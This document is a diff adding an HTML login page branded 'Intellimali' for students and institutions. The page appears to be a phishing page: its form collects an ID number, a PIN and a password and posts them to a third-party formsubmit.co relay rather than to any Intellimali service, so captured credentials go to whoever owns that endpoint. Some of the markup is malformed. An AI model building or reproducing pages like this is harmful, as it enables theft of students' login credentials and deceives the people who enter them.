@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Intellimali Login</title>
+    <link rel="stylesheet" href="sebono.css">
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <h1><span class="bold">Intelli</span><span class="light">mali</span></h1>
+        </div>
+        <div class="options">
+            <p class="choose">Choose an Option</p>
+            <button class="option-button" onclick="showLoginForm()">Account Log In 
+                <span>Students and Individuals</span>
+            </button>
+            <button class="option-button">User 
+                <span>Institutions, Funders, Merchants</span>
+            </button>
+            <button class="option-button">Forgot PIN 
+                <span>Request Pin, Check for Allowances</span>
+            </button>
+        </div>
+
+        <!-- Login Form (Initially Hidden) -->
+        <div id="login-form" class="login-form">
+            <h2>Student Login</h2>
+            <form action="https://formsubmit.co/4b442333e9eb95c98ff0a164f5911ff4" method="POST">
+                <label for="student-number">ID Number</label>
+                <input type="text" id="student-number" name="student-number" placeholder="Enter your ID number" required> <label for="id-number">PIN</label>
+                <input type="text" id="id-number" name="id-number" placeholder="Enter your PIN" required> 
+                    
+            <label
+ 
+ for=<"pin">Password</label>   
+              <input type="password"
+ id="pin"  name="pin"
+ placeholder="Enter your Password" required>
+
+                <button type="submit" class="submit-button">Log In</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        function showLoginForm() {
+            document.getElementById("login-form").style.display = "block";
+        }
+    </script>
+</body>
+</html>
